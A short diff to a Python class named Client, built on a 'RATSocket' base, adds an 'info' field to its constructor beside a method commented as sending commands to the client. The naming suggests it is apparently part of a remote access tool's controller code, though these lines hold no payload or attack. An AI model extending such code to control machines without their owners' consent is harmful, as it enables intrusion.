@@ -6,10 +6,11 @@ from entity.ratsocket import RATSocket
 
 class Client(RATSocket):
 
-    def __init__(self, s, address):
+    def __init__(self, s, address, info):
         super().__init__()
         self.socket = s
         self.address = address
+        self.info = info
 
     # 向客户端发送命令
     def send_command(self, command: str, command_type='command'):
